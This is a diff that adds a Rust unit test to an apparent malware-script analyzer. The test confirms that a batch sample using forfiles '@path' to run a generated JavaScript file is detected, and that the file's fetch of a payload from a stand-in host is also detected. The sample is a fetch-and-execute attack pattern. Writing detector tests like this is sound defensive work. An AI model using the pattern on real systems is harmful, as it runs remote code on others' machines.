@@ -10656,6 +10656,30 @@ mod child_tests {
             report.traits
         );
     }
+
+    #[test]
+    fn forfiles_path_placeholder_feeds_tracked_script_execution() {
+        let script = br#"echo fetch('https://forfiles-path.example/payload') > C:\Work\run.js
+forfiles /p C:\Work /m *.js /c "cmd /c @path""#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::WscriptExec { src } if src == r#"c:\work\run.js"#) }),
+            "forfiles @path did not dispatch generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://forfiles-path.example/payload")
+            }),
+            "forfiles @path child did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
